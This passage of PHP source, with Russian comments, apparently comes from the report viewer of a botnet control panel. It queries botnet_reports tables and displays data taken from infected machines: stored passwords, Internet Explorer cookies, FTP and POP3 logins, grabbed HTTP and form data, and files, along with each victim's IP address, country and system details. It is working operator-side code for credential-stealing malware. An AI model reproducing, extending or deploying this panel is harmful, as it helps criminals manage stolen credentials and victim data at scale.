    $q = 'SELECT id, bot_id, country, ipv4, SUBSTRING(context, 1, '.REPORT_PREVIEW_MAX_CHARS.'), SUBSTRING(path_source, 1, '.REPORT_PREVIEW_MAX_CHARS.'), type FROM '.$table.$query1.$query2;
    $r = @mysql_query($q);
    if(!$r)die(mysql_error_ex());
    if(mysql_affected_rows() == 0)die(LNG_REPORTS_DATE_NOREPORTS);
    
    //Выводим результат.
    $nn = $_FILTER['nonames']; 
    while(($m = mysql_fetch_row($r)))
    {
      //Запись нового имени бота.
      if($nn === 0 && strcasecmp($m[1], $last_botid) !== 0)
      {
        $last_botid = $m[1];
        echo THEME_STRING_NEWLINE.str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlentities_ex($m[1]), ''), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3).'&#160;'.
             BotPopupMenu($m[1], 'botmenu').THEME_STRING_NEWLINE.htmlentities_ex($m[2].', '.$m[3]).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
      }
      
      //Запись заголовка лога.
      $st1 = trim($m[4]);
      $st2 = trim($m[5]);
      if(mb_strlen($st1) >= REPORT_PREVIEW_MAX_CHARS)$st1 .= '...';
      if(mb_strlen($st2) >= REPORT_PREVIEW_MAX_CHARS)$st2 .= '...';
      
      $text = '';
      switch($m[6])
      {
        case BLT_PROTECTED_STORAGE: $text = LNG_BLT_PROTECTED_STORAGE; break;
        case BLT_COOKIES_IE:        $text = LNG_BLT_IE_COOKIES; break;
        case BLT_FILE:              $text = LNG_BLT_FILE.'. '.htmlentities_ex($st2); break;
        case BLT_HTTP_REQUEST:
        case BLT_HTTPS_REQUEST:     $text = htmlentities_ex($st2); break;
        case BLT_LOGIN_FTP:         $text = str_replace(array('{URL}', '{TEXT}'), htmlentities_ex($st1), THEME_STRING_REPORTPREVIEW_FTP); break;
        case BLT_LOGIN_POP3:        $text = htmlentities_ex($st1); break;
        case BLT_GRABBED_UI:        $text = LNG_BLT_GRABBED_UI.'. '.htmlentities_ex($st2); break;
        case BLT_GRABBED_HTTP:      $text = LNG_BLT_GRABBED_HTTP.'. '.htmlentities_ex($st2); break;
        case BLT_GRABBED_WSOCKET:   $text = LNG_BLT_GRABBED_WSOCKET.'. '.htmlentities_ex($st2); break;
        case BLT_GRABBED_OTHER:     $text = LNG_BLT_GRABBED_OTHER.'. '.htmlentities_ex($st2); break;
        //case BLT_UNKNOWN:
        default:                    $text = LNG_BLT_UNKNOWN;
      }

      echo str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;t='.htmlentities_ex($_FILTER['date']).'&amp;id='.$m[0], $text), THEME_STRING_REPORTPREVIEW).THEME_STRING_NEWLINE;
    }
  }
}
else if($_is_plain_search)
{
  define('REPEAT_SIZE', 40); //Размер визальных разделитилей.
  define('HEADER_PAD',  30); //Длина заголовков.
  
  header('Content-Type: text/plain; charset=utf-8');
  HTTPNoCacheHeaders();
  echo "\xEF\xBB\xBF"; //UTF8 BOM
  
  $nc = $_FILTER['nonames'];
  
  foreach($rlist as $t)
  {
    $v = intval(substr($t, -6));
    if($v >= $_FILTER['date1'] && $v <= $_FILTER['date2'])
    {
      $lastdata = array_fill(0, 15, 0);
      
      //Заголовок даты.
      echo str_repeat('=', REPEAT_SIZE).' '.gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)).' '.str_repeat('=', REPEAT_SIZE)."\r\n";
      flush();
      
      //Запрос.                 //0     //1     //2          //3         //4          //5          //6             //7        //8    //9      //10  //11          //12         //13
      $r = @mysql_query('SELECT bot_id, botnet, bot_version, os_version, language_id, time_system, time_localbias, time_tick, rtime, country, ipv4, process_name, path_source, type,'.
                                //14      //15
                        'LENGTH(context), context FROM '.$t.$query1.$query2);
      if(!$r)echo mysql_error_ex();
      else if(mysql_affected_rows() == 0)echo LNG_REPORTS_DATE_NOREPORTS;
      else while(($m = mysql_fetch_row($r)))
      {
        if($nc !== 1)
        {
          $hdr = '';
          
          //FIXME: А где mb_strcasecmp?
          if(strcmp($lastdata[0], $m[0]) !== 0)
          {
            $lastdata = array_fill(0, 15, 0);
            $hdr .= str_pad(LNG_REPORTS_VIEW_BOTID, HEADER_PAD).($lastdata[0] = $m[0])."\r\n";
          }
          
          if(strcmp($lastdata[1], $m[1]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_BOTNET,  HEADER_PAD).               ($lastdata[1] = $m[1])."\r\n";
          if($lastdata[2] !== $m[2])           $hdr .= str_pad(LNG_REPORTS_VIEW_VERSION, HEADER_PAD).IntToVersion(  ($lastdata[2] = $m[2]))."\r\n";
          if(strcmp($lastdata[3], $m[3]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_OS,      HEADER_PAD).OSDataToString(($lastdata[3] = $m[3]))."\r\n";
          if($lastdata[4] !== $m[4])           $hdr .= str_pad(LNG_REPORTS_VIEW_OSLANG,  HEADER_PAD).               ($lastdata[4] = $m[4])."\r\n";
          
          $hdr .= str_pad(LNG_REPORTS_VIEW_TIME, HEADER_PAD).gmdate(LNG_FORMAT_DT, $m[5] + $m[6])."\r\n";
          
          if($lastdata[6] !== $m[6])$hdr .= str_pad(LNG_REPORTS_VIEW_TIMEBIAS, HEADER_PAD).TimeBiasToText(($lastdata[6] = $m[6]))."\r\n";
          
          $hdr .= str_pad(LNG_REPORTS_VIEW_TICK,  HEADER_PAD).TickCountToTime($m[7] / 1000)."\r\n";
          $hdr .= str_pad(LNG_REPORTS_VIEW_RTIME, HEADER_PAD).gmdate(LNG_FORMAT_DT, $m[8])."\r\n";
          
          if(strcmp($lastdata[9], $m[9]) !== 0)  $hdr .= str_pad(LNG_REPORTS_VIEW_COUNTRY,  HEADER_PAD).($lastdata[9]  = $m[9])."\r\n";
          if(strcmp($lastdata[10], $m[10]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_IPV4,     HEADER_PAD).($lastdata[10] = $m[10])."\r\n";
          
          echo "\r\n".str_repeat('=', REPEAT_SIZE)."\r\n".
               $hdr.
               str_pad(LNG_REPORTS_VIEW_PROCNAME, HEADER_PAD).(empty($m[11]) ? '-' : $m[11])."\r\n".
               str_pad(LNG_REPORTS_VIEW_SOURCE,   HEADER_PAD).(empty($m[12]) ? '-' : $m[12])."\r\n".
               str_pad(LNG_REPORTS_VIEW_TYPE,     HEADER_PAD).BltToLng($m[13])."\r\n".
               str_pad(LNG_REPORTS_VIEW_SIZE,     HEADER_PAD).number_format_as_int($m[14])."\r\n".
               "\r\n".str_repeat('-', REPEAT_SIZE)."\r\n";
        }
        
        echo $m[15]."\r\n";  
        flush();
      }
      
      echo "\r\n";  
    }
  }
  
  echo "\r\n".str_repeat('=', REPEAT_SIZE).' EOF '.str_repeat('=', REPEAT_SIZE);
}

die();

///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
  Создание списка дат по таблицам botnet_reports_* для элемента select.
  
  IN $name  - string, название элемента select.
  IN $rlist - array, список таблиц.
  
  Return    - string, набор THEME_DIALOG_ITEM_LISTBOX_ITEM.
*/
function MakeDateList($name, $rlist)
{
  global $_FILTER;
  $rlist_count = count($rlist);
  $f = '';
  
  if($rlist_count == 0)
  {
    $f .= str_replace(array('{VALUE}', '{TEXT}'), array(0, '--.--'), THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR);
  }
  else for($i = 0, $cur = 0; $i < $rlist_count; $i++)
  {
    if($cur == 0 && ($_FILTER[$name] === intval(substr($rlist[$i], -6)) || $i + 1 == $rlist_count))
    {
      $item = THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR;
      $cur++;
    }
    else $item = THEME_DIALOG_ITEM_LISTBOX_ITEM;
  
    $f .= str_replace(array('{VALUE}', '{TEXT}'), array(htmlentities_ex(substr($rlist[$i], -6)), htmlentities_ex(substr($rlist[$i], -2, 2).'.'.substr($rlist[$i], -4, 2))), $item);
  }
  
  return $f;
}
?>